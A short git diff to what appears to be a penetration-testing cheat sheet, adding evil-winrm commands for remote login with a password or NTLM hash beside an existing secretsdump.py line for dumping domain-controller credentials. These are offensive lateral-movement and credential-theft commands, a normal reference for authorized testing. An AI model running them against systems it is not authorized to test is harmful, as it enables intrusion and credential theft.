@@ -118,6 +118,15 @@ Dumpling Credentials from the Domain Controller
 ```
 python3 secretsdump.py -just-dc-ntlm <WORKSTATION>/<username>@<IP> 
 ```
+WinRM to device using password or hash
+
+https://github.com/Hackplayers/evil-winrm
+```
+ruby evil-winrm.rb -i IP -u <username> -p '<password>' -s '/path/to/scripts'
+```
+```
+ruby evil-winrm.rb -i IP -u <username> -H '<hash>' -s '/path/to/scripts'
+```
 
 ### [Download file]
 
